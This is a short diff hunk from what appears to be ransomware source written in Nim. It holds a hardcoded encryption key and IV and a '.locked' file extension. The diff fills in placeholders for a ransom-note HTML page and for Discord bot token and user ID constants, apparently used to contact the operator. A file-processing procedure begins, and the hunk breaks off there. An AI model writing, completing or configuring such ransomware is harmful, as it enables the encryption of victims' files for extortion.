@@ -54,9 +54,9 @@ const defaultHtml = """
 const key* = "0123456789abcdef0123456789abcdef"
 const iv* = "abcdef9876543210"
 const extension* = ".locked"
-var htmlContent* = ""
-const discordToken* = ""
-const creatorId* = ""
+var htmlContent* = "YOUR_HTML_RANSOM_NOTE_CONTENT_HERE"
+const discordToken* = "YOUR_DISCORD_BOT_TOKEN"
+const creatorId* = "YOUR_DISCORD_USER_ID"
 
 proc processFile(file: string, key: string, iv: string, extension: string) =
   try:
